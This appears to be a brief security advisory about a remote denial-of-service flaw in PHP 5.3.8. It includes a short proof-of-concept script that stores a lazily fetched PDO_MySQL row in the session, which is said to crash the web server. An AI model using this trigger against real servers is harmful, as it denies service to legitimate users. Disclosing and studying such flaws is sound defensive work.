source: http://www.securityfocus.com/bid/51952/info

PHP is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to cause the web server to crash, denying service to legitimate users.

PHP 5.3.8 is vulnerable; other versions may also be affected. 

<?php

// make a Pdo_Mysql statement before

$result = $stmt->fetch(PDO::FETCH_LAZY);

session_start();

$_SESSION['PDORow'] = $result;
?>